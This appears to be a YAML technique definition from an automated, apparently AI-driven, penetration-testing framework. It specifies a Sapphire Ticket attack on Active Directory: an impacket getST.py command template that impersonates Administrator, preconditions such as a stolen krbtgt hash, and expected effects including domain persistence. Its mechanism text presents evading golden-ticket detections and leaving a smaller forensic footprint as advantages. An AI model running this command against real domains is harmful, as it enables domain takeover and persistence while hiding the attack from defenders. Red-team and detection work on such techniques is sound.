name: saphire_ticket
category: ad
description: Sapphire ticket — S4U2self+U2U + krbtgt re-encrypt for stealthy forged
  TGT
preconditions:
- has_krbtgt_hash
- has_cred
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
  domain: from_engagement.domain
  krbtgt_hash: from_cred.krbtgt_nt_hash
  target_user: Administrator
command_template: getST.py -k -no-pass -self -altservice cifs/dc.{domain} -impersonate
  {target_user} '{domain}/{username}'
parser: impacket_parser
expected_effects:
- saphire_ticket_forged
- arbitrary_user_session
- domain_persistence
falsifier:
  pattern: KDC_ERR|KRB_AP_ERR|ACCESS_DENIED|denied
  timeout: 45
model_tier: sonnet
mechanism: 'Request a TGS via S4U2self+U2U as a target user, then re-encrypt with
  the krbtgt key

  to forge a TGT. Lower forensic footprint than golden ticket — the source TGS comes

  from a real KDC interaction, only the final re-encrypt is local. Bypasses many

  golden-ticket detections that look for TGT artifacts inconsistent with normal traffic.

  '
references:
  ocd_mindmap: 'Branch 13: Sapphire Ticket'
  hacktricks: windows-hardening/active-directory-methodology/silver-ticket.md
hacktricks_ref: windows-hardening/cobalt-strike.md
